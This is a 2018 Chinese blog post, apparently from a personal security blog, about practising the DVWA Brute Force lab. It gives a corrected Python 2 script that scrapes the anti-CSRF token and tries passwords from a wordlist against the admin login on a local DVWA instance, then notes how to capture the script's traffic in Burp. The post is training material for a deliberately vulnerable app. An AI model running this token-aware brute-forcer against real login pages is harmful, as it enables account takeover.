@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DVWA之Brute Force更新 - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>DVWA之Brute Force更新</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2018-02-28 00:18</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h1 id="前言">前言</h1>
+<p>今天又练习了一遍DVWA，发现了一些小问题。</p>
+<h1 id="问题一">问题一</h1>
+<p>在原文http://www.freebuf.com/articles/web/116437.html 中的python代码我重新运行了一遍，发现有错误。提示没有这个<code>'input'</code>的Type,所以我做了下修改就能正常运行了。
+原先的<code>user_token = soup.form.input.input.input.input[&quot;value&quot;]</code>
+改成了<code>user_token = soup.find_all(&quot;input&quot;)[3].get(&quot;value&quot;)# get the user_token</code>
+代码如下：</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+<span style="color:#f92672">import</span> urllib2
+header<span style="color:#f92672">=</span>{        <span style="color:#e6db74">&#39;Host&#39;</span>: <span style="color:#e6db74">&#39;192.168.59.127&#39;</span>,
+		<span style="color:#e6db74">&#39;Cache-Control&#39;</span>: <span style="color:#e6db74">&#39;max-age=0&#39;</span>,
+		<span style="color:#e6db74">&#39;If-None-Match&#39;</span>: <span style="color:#e6db74">&#34;307-52156c6a290c0&#34;</span>,
+		<span style="color:#e6db74">&#39;If-Modified-Since&#39;</span>: <span style="color:#e6db74">&#39;Mon, 05 Oct 2015 07:51:07 GMT&#39;</span>,
+		<span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&#39;</span>,
+		<span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;*/*&#39;</span>,
+		<span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://192.168.59.127/dvwa/vulnerabilities/brute/index.php&#39;</span>,
+		<span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate, sdch&#39;</span>,
+		<span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;zh-CN,zh;q=0.8&#39;</span>,
+		<span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;security=high; PHPSESSID=4ac4tdpdn25suknveha54ml3i2&#39;</span>}
+requrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.59.127/dvwa/vulnerabilities/brute/&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_token</span>(requrl,header):
+    req <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>Request(url<span style="color:#f92672">=</span>requrl, headers<span style="color:#f92672">=</span>header)
+    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(req)
+    <span style="color:#66d9ef">print</span> response<span style="color:#f92672">.</span>getcode(),
+    the_page <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
+    <span style="color:#66d9ef">print</span> len(the_page)
+    soup <span style="color:#f92672">=</span> BeautifulSoup(the_page, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
+    user_token <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#34;input&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)<span style="color:#75715e"># get the user_token</span>
+    <span style="color:#75715e">#user_token = soup.form.input.input.input.input[&#34;value&#34;]  # get the user_token</span>
+    <span style="color:#66d9ef">return</span> user_token
+
+
+user_token <span style="color:#f92672">=</span> get_token(requrl,header)
+i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> open(<span style="color:#e6db74">&#34;pass.txt&#34;</span>):
+	requrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.59.127/dvwa/vulnerabilities/brute/&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;?username=admin&amp;password=&#34;</span><span style="color:#f92672">+</span>line<span style="color:#f92672">.</span>strip()<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;Login=Login&amp;user_token=&#34;</span><span style="color:#f92672">+</span>user_token
+	i <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+	<span style="color:#66d9ef">print</span> i,<span style="color:#e6db74">&#39;admin&#39;</span>,line<span style="color:#f92672">.</span>strip(),
+	user_token <span style="color:#f92672">=</span> get_token(requrl,header)
+	<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>):
+		<span style="color:#66d9ef">break</span>	
+</code></pre></div><h1 id="问题二">问题二</h1>
+<p>我在freebuf上面看到下面的评论说怎么在cmd运行，能在burp上面抓取到信息。
+我原先想在pycharm上面运行，然后抓取，发现设置了http代理不行。
+官方设置教程：http://www.jetbrains.com/help/pycharm/http-proxy.html
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/pychram_http.png" alt="pycharm_http-proxy"></p>
+<p>后来想到了在cmd下面设置代理不就行了吗，参考了文章：
+<a href="http://blog.csdn.net/rznice/article/details/50705451">http://blog.csdn.net/rznice/article/details/50705451</a></p>
+<p>成功实现了作者的burp抓取cmd的流量：
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmd_burp.png" alt="pycharm_http-proxy"></p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
+                            前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e9%97%ae%e9%a2%98%e4%b8%80">
+                            问题一
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e9%97%ae%e9%a2%98%e4%ba%8c">
+                            问题二
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
